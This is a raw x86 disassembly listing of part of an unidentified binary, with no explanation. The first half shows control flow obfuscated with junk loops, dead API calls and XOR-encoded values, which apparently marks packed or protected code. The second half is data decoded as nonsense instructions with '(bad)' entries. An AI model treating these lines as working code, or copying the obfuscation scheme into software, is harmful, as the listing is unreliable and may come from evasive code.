  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423953
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42393e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a74
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x6fd7ebdc
  41ccad:	fwait
  41ccae:	jb     0x41cc70
  41ccb0:	xchg   edi,eax
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx-0x6]
  41ccb9:	jo     0x41cd0a
  41ccbb:	out    0x86,eax
  41ccbd:	lahf   
  41ccbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccbf:	ret    
  41ccc0:	jmp    0xcee:0x96afb538
  41ccc7:	jp     0x41ccff
  41ccc9:	call   0x9a47af57
  41ccce:	imul   ebx,DWORD PTR [ecx+0x3b],0xe52107e7
  41ccd5:	sbb    al,dl
  41ccd7:	inc    ecx
  41ccd8:	in     al,dx
  41ccd9:	jns    0x41cd34
  41ccdb:	aaa    
  41ccdc:	shl    DWORD PTR [edi+esi*2],0x4c
  41cce0:	push   edx
  41cce1:	jl     0x41cd3b
  41cce3:	mov    ecx,0xd79ef022
  41cce8:	pop    edi
  41cce9:	adc    dh,BYTE PTR [eax+0x626252af]
  41ccef:	mov    cl,0x1c
  41ccf1:	je     0x41cce6
  41ccf3:	mov    bh,0x69
  41ccf5:	scas   eax,DWORD PTR es:[edi]
  41ccf6:	jmp    0x416b:0x8a1bf1ab
  41ccfd:	adc    al,0x8f
  41ccff:	(bad)  
  41cd01:	push   esp
  41cd02:	jns    0x41cd30
  41cd04:	mov    ?,WORD PTR [eax-0x4ba4b7ec]
  41cd0a:	jmp    0x1761:0x826ad302
  41cd11:	pop    ss
  41cd12:	dec    ecx
  41cd13:	mov    eax,ds:0x899b0054
  41cd18:	mov    BYTE PTR [eax+0x74],bh
  41cd1b:	rcr    DWORD PTR [edi+0x4fec6a3d],1
  41cd21:	fild   QWORD PTR [edi-0x127ef2c2]
  41cd27:	xchg   edx,eax
  41cd28:	sahf   
  41cd29:	add    DWORD PTR [edi+ebx*4+0x45642d49],esi
  41cd30:	mov    esp,0x683d24e6
  41cd35:	loope  0x41ccd8
  41cd37:	scas   al,BYTE PTR es:[edi]
  41cd38:	js     0x41cd94
  41cd3a:	mov    ebp,0x35ca4c94
  41cd3f:	(bad)  
  41cd40:	cmp    DWORD PTR [ecx+eax*1-0x127a977d],ecx
  41cd47:	scas   al,BYTE PTR es:[edi]
  41cd48:	ficom  WORD PTR [ebx]
  41cd4a:	or     BYTE PTR [edi-0x898b73],dl
  41cd50:	mov    bl,0x6
  41cd52:	pop    esi
  41cd53:	push   ds
  41cd54:	popf   
  41cd55:	jbe    0x41cd82
  41cd57:	pop    esp
  41cd58:	mov    cl,0x9f
  41cd5a:	retf   0xe8fe
  41cd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd5e:	sbb    esp,DWORD PTR [edx-0x26a4f4f5]
  41cd64:	add    esi,DWORD PTR [ebx-0x1d]
  41cd67:	(bad)  
  41cd68:	push   esi
  41cd69:	out    dx,al
  41cd6a:	lahf   
  41cd6b:	bnd jb 0x41cdba
  41cd6e:	bound  eax,QWORD PTR [esi+0x7a]
  41cd71:	xchg   esi,eax
  41cd72:	inc    ecx
  41cd73:	pop    esp
  41cd74:	push   esp
  41cd75:	jge    0x41cd4d
  41cd77:	adc    esp,DWORD PTR [edi+0x2d9f170f]
  41cd7d:	pop    ds
  41cd7e:	cwde   
  41cd7f:	add    cl,al
  41cd81:	add    eax,eax
  41cd83:	cdq    
  41cd84:	out    0xcb,eax
  41cd86:	fwait
  41cd87:	pop    esi
  41cd88:	xor    eax,DWORD PTR [esi-0x1f]
  41cd8b:	or     esi,edi
  41cd8d:	(bad)  
  41cd8e:	(bad)  
  41cd8f:	mov    edi,0x1756bed6
  41cd94:	and    ecx,DWORD PTR [edx-0x4351ad4c]
  41cd9a:	mov    cl,0x3b
  41cd9c:	lock mov ebx,0x843e6d40
  41cda2:	dec    ebx
  41cda3:	cmp    BYTE PTR ds:0xf15aa0ad,bh
  41cda9:	push   es
  41cdaa:	add    DWORD PTR [eax-0x177a407d],0x51
  41cdb1:	cmp    edx,DWORD PTR [edx]
  41cdb3:	test   eax,0xf23d655e
  41cdb8:	jae    0x41cd91
  41cdba:	jmp    0x41cd75
  41cdbc:	jno    0x41cdde
  41cdbe:	xor    esi,ebp
  41cdc0:	and    BYTE PTR [ebp+0x260317f7],dh
  41cdc6:	icebp  
  41cdc7:	(bad)  
  41cdc8:	retf   0xb08e
  41cdcb:	pop    esi
  41cdcc:	xor    BYTE PTR [edx-0x24],bl
  41cdcf:	inc    esp
  41cdd0:	cmp    DWORD PTR [edi-0x7b056505],ebp
  41cdd6:	pop    edx
  41cdd8:	push   esp
  41cdd9:	pop    ss
  41cdda:	mov    bh,0x10
  41cddc:	mov    dh,0x59
  41cdde:	dec    eax
  41cddf:	jne    0x41ce2e
  41cde1:	xor    DWORD PTR [esi-0x34],eax
  41cde4:	aas    
  41cde5:	xchg   BYTE PTR [ebx],dh
  41cde7:	inc    ebx
  41cde8:	loop   0x41ce59
  41cdea:	(bad)  
  41cdec:	pushf  
  41cded:	dec    edi
  41cdee:	adc    al,0xd3
  41cdf0:	lods   al,BYTE PTR ds:[esi]
  41cdf1:	and    ebx,DWORD PTR [edx-0x570addc1]
  41cdf7:	scas   al,BYTE PTR es:[edi]
  41cdf8:	pop    esp
  41cdf9:	mov    ah,0x86
  41cdfb:	jp     0x41cda3
  41cdfd:	test   DWORD PTR [ebx-0x585c96ce],0xa9209c39
  41ce07:	(bad)  
  41ce09:	jae    0x41ce56
  41ce0b:	pop    es
  41ce0c:	sub    DWORD PTR [eax],0xffffffd4
  41ce0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce10:	into   
  41ce11:	inc    ecx
  41ce12:	stos   DWORD PTR es:[edi],eax
  41ce13:	jo     0x41ce5b
  41ce15:	xor    cl,BYTE PTR [edx+0x2f]
  41ce18:	fucom  st(6)
  41ce1a:	(bad)  
  41ce1b:	outs   dx,BYTE PTR ds:[esi]
  41ce1c:	jnp    0x41cdd6
  41ce1e:	mov    ah,0x30
  41ce20:	pusha  
  41ce21:	clc    
  41ce22:	int3   
  41ce23:	sub    DWORD PTR [ebx+0x71b94a29],ebx
  41ce29:	out    0x5e,al
  41ce2b:	jns    0x41cde9
  41ce2d:	stc    
  41ce2e:	inc    esi
  41ce2f:	mov    dh,0xa4
  41ce31:	mov    ah,0x6a
  41ce33:	addr16 cli 
  41ce35:	jnp    0x41ce25
  41ce37:	(bad)  
  41ce39:	aad    0x58
  41ce3b:	xchg   DWORD PTR [edi+ecx*8+0x24],ebp
  41ce3f:	cmp    BYTE PTR [edx+0x60],ch
  41ce42:	imul   eax,DWORD PTR [ebx+0x4a41d807],0xffffff84
  41ce49:	adc    eax,0x4fa83599
  41ce4e:	and    al,0xd4
  41ce50:	out    0x66,al
  41ce52:	sbb    edi,esp
  41ce54:	imul   edx,DWORD PTR [ebp+0x7af7de67],0xffffffe8
  41ce5b:	nop
  41ce5c:	sti    
  41ce5d:	cld    
  41ce5e:	cmp    al,0xe6
  41ce60:	int3   
  41ce61:	data16 loopne 0x41ce41
  41ce64:	inc    edi
  41ce65:	bound  esi,QWORD PTR [ebp-0x6b75d20e]
  41ce6b:	jl     0x41cdef
  41ce6d:	jbe    0x41cec4
  41ce6f:	mov    ?,WORD PTR [eax]
  41ce71:	dec    esi
  41ce72:	sbb    dl,0xb3
  41ce75:	mov    esp,0xe6bdfd99
  41ce7a:	js     0x41ce69
  41ce7c:	sahf   
  41ce7d:	or     DWORD PTR [ebx+0x76781dc7],esi
  41ce83:	push   0xa3939701
  41ce88:	mov    esi,0xe8f567c7
  41ce8d:	shl    ebp,0x68
  41ce90:	mov    ebx,0x78a48161
  41ce95:	mov    esp,0xf79483d8
  41ce9a:	xor    cl,BYTE PTR [edx+0x4f]
  41ce9d:	out    0x9,eax
  41ce9f:	cld    
  41cea0:	add    DWORD PTR [eax-0x27],0x6
  41cea4:	push   edi
  41cea5:	and    ebx,ebp
  41cea7:	add    dh,dh
  41cea9:	pushf  
  41ceaa:	jnp    0x41cea8
  41ceac:	stc    
  41cead:	or     ebp,DWORD PTR [esi]
  41ceaf:	or     ah,BYTE PTR [edx-0xdcb1252]
  41ceb5:	sar    DWORD PTR [ebx-0x7b8f965],1
  41cebb:	imul   ebp,DWORD PTR [ecx-0x14755595],0x16
  41cec2:	xor    eax,0x2e81186b
  41cec7:	gs add esp,edi
  41ceca:	pop    edi
  41cecb:	sbb    al,BYTE PTR [esi-0xc]
  41cece:	mov    WORD PTR [ecx-0x371c9e32],fs
  41ced4:	mov    BYTE PTR [ebx],bl
  41ced6:	mov    al,ds:0xbf48a073
  41cedb:	adc    BYTE PTR [esi],ah
  41cedd:	sub    ch,cl
  41cedf:	add    ch,bh
  41cee1:	imul   ecx,DWORD PTR [edi-0x68ab2dd4],0xffffffcf
  41cee8:	xchg   BYTE PTR [esi],dl
  41ceea:	mov    eax,ds:0xc37a2714
  41ceef:	jno    0x41cf27
  41cef1:	inc    edi
  41cef2:	xor    al,BYTE PTR [eax-0x5e]
  41cef5:	or     al,0xa3
  41cef7:	mov    ch,0x1e
  41cef9:	(bad)  
  41cefa:	dec    ecx
  41cefb:	xchg   esi,eax
  41cefc:	xor    al,0x4f
  41cefe:	arpl   WORD PTR [esi-0x39],cx
  41cf01:	xor    al,0xc5
  41cf03:	ret    0x228f
  41cf06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf07:	mov    ebx,DWORD PTR [edi+0x23]
  41cf0a:	shl    BYTE PTR [esi+ebx*1-0x3d],cl
  41cf0e:	and    BYTE PTR [eax+eiz*8+0x6f],al
  41cf12:	mov    BYTE PTR ds:0x6ec42f98,al
  41cf18:	cmp    eax,0xa572dd76
  41cf1d:	sub    BYTE PTR ds:0x925b0661,bh
  41cf23:	jmp    0x3ec8:0xe29c1392
  41cf2a:	das    
  41cf2b:	jl     0x41cf7d
  41cf2d:	sub    DWORD PTR [ebx],eax
  41cf2f:	mov    esp,0x6f7d1dc1
  41cf34:	leave  
  41cf35:	mov    WORD PTR [ebx+0x3],?
  41cf38:	pusha  
  41cf39:	std    
  41cf3a:	sti    
  41cf3b:	ins    BYTE PTR es:[edi],dx
  41cf3c:	inc    ebp
  41cf3d:	sub    eax,0x13838745
  41cf42:	inc    ecx
  41cf43:	cwde   
  41cf44:	fs mov cl,0x98
  41cf47:	pop    esp
  41cf48:	mul    BYTE PTR [ebp+0x2e7a59af]
  41cf4e:	and    al,cl
  41cf50:	test   DWORD PTR [eax],ebp
  41cf52:	outs   dx,DWORD PTR ds:[esi]
  41cf53:	mov    dh,BYTE PTR [esi+0x6a]
  41cf56:	scas   eax,DWORD PTR es:[edi]
  41cf57:	popf   
  41cf58:	pop    edx
  41cf59:	pop    edx
  41cf5a:	inc    ecx
  41cf5b:	sbb    al,0xd6
  41cf5d:	dec    ebx
  41cf5e:	(bad)  
  41cf5f:	in     eax,0xaa
  41cf61:	mov    esi,0x51cc57fa
  41cf66:	push   cs
  41cf67:	push   0xffffff9b
  41cf69:	pusha  
  41cf6a:	imul   eax,edi,0x16
  41cf6d:	mov    BYTE PTR [eax],bh
  41cf6f:	das    
  41cf70:	add    ch,BYTE PTR [edi+0x1472f11a]
  41cf76:	mov    ah,0x33
  41cf78:	(bad)
  41cf7c:	inc    ebp
  41cf7d:	imul   DWORD PTR [eax]
  41cf7f:	sahf   
  41cf80:	push   ss
  41cf81:	and    al,0x1
  41cf83:	in     al,0xed
  41cf85:	sbb    BYTE PTR [eax-0x153b4c19],0x94
  41cf8c:	clc    
  41cf8d:	retf   0xe89f
  41cf90:	test   al,0xa4
  41cf92:	or     al,0x93
  41cf94:	pop    ebp
  41cf95:	out    0x5f,eax
  41cf97:	jle    0x41cfa1
  41cf99:	cmc    
  41cf9a:	xchg   esi,eax
  41cf9b:	call   0x7286:0x983eb3a8
  41cfa2:	xor    al,0x7a
  41cfa4:	fsubr  st(1),st
  41cfa6:	das    
  41cfa7:	add    dl,dl
  41cfa9:	add    ecx,eax
  41cfab:	xor    al,0xb7
  41cfad:	xlat   BYTE PTR ds:[ebx]
  41cfae:	xchg   ecx,eax
  41cfaf:	fistp  DWORD PTR [edx+edx*2+0x5d6a051a]
  41cfb6:	inc    ebp
  41cfb7:	jnp    0x41cf7d
  41cfb9:	and    eax,0x21ccab3c
  41cfbe:	push   ebp
  41cfbf:	add    edi,ecx
  41cfc1:	es into 
  41cfc3:	shr    BYTE PTR [ebp+0x35],1
  41cfc6:	or     eax,0xe149e7f2
  41cfcb:	imul   ecx,DWORD PTR [ecx+0x3c9f6599],0xffffff98
  41cfd2:	sti    
  41cfd3:	fs popa 
  41cfd5:	and    esi,eax
  41cfd7:	or     esp,ebx
  41cfd9:	fidiv  WORD PTR [edi+0x79]
  41cfdc:	mov    WORD PTR [ebx+0x3],gs
  41cfdf:	push   edi
  41cfe0:	push   eax
  41cfe1:	adc    cl,BYTE PTR [edx+ebx*2]
  41cfe4:	cs leave 
  41cfe6:	mov    DWORD PTR [edi+0x18ead865],esp
  41cfec:	loopne 0x41cfd7
  41cfee:	mov    al,0x64
  41cff0:	je     0x41d006
  41cff2:	xchg   ecx,eax
  41cff3:	enter  0xe040,0xf7
  41cff7:	pop    esi
  41cff8:	sbb    al,0x20
  41cffa:	adc    ch,bl
